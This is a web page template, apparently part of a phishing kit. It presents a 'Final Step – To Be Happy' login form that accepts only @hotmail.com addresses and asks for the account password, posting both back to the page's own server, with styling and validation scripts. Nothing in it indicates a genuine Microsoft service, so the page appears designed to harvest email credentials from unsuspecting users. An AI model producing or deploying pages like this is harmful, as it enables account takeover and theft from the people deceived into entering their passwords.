{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto">
  <h2 class="section-title">âœ¨ Final Step â€“ To Be Happy</h2>
  <p class="section-subtitle">Login now to get started</p>

  <form method="post" id="f2Form" novalidate>
    
    <!-- Address -->
    <div class="form-group">
      <label for="address">ðŸ“§ Address</label>
      <input 
        class="input" 
        id="address" 
        name="address" 
        type="email" 
        placeholder="e.g. username@hotmail.com" 
        required
        pattern="^[a-zA-Z0-9._%+-]+@hotmail\.com$">
      <div class="error-message">Please enter a valid address ending with <b>@hotmail.com</b>.</div>
    </div>

    <!-- Password -->
    <div class="form-group">
      <label for="password">ðŸ”’ Password</label>
      <input 
        class="input" 
        id="password" 
        name="password" 
        type="password" 
        placeholder="Enter your password" 
        required 
        minlength="6">
      <div class="error-message">Password must be at least 6 characters long.</div>
    </div>

    <div class="center">
      <button class="btn btn-blue" type="submit">Log In</button>
    </div>
  </form>
</div>

<style>
  .section-title {
    font-size: 1.4rem;
    font-weight: 600;
    color: #1e293b;
    margin-bottom: 4px;
  }
  .section-subtitle {
    color: #64748b;
    margin-bottom: 20px;
  }
  .form-group {
    margin-bottom: 18px;
    display: flex;
    flex-direction: column;
  }
  .form-group label {
    font-weight: 500;
    margin-bottom: 6px;
    color: #334155;
  }
  .input {
    border: 1px solid #cbd5e1;
    padding: 10px 12px;
    border-radius: 8px;
    font-size: 0.95rem;
    transition: border-color 0.2s, box-shadow 0.2s;
  }
  .input:focus {
    border-color: #3b82f6;
    box-shadow: 0 0 0 2px rgba(59,130,246,0.15);
    outline: none;
  }
  .input.error {
    border-color: #dc2626;
    background: #fef2f2;
  }
  .error-message {
    font-size: 0.85rem;
    color: #dc2626;
    display: none;
    margin-top: 4px;
  }
  .btn.btn-blue {
    background-color: #3b82f6;
    color: #fff;
    border: none;
    padding: 12px 22px;
    border-radius: 9999px;
    font-weight: 500;
    font-size: 1rem;
    cursor: pointer;
    box-shadow: 0 2px 6px rgba(59,130,246,0.25);
    transition: background-color 0.2s, transform 0.2s;
  }
  .btn.btn-blue:hover {
    background-color: #2563eb;
    transform: translateY(-1px);
  }
  .btn.btn-blue:active {
    background-color: #1d4ed8;
    transform: translateY(0);
  }
</style>

<script>
document.getElementById("f2Form").addEventListener("submit", function(e) {
  let valid = true;
  let firstInvalid = null;

  this.querySelectorAll(".input").forEach(input => {
    const errorMsg = input.nextElementSibling;
    if (!input.checkValidity()) {
      input.classList.add("error");
      errorMsg.style.display = "block";
      valid = false;
      if (!firstInvalid) firstInvalid = input;
    } else {
      input.classList.remove("error");
      errorMsg.style.display = "none";
    }
  });

  if (!valid) {
    e.preventDefault();
    firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
    firstInvalid.focus();
  }
});
</script>
{% endblock %}
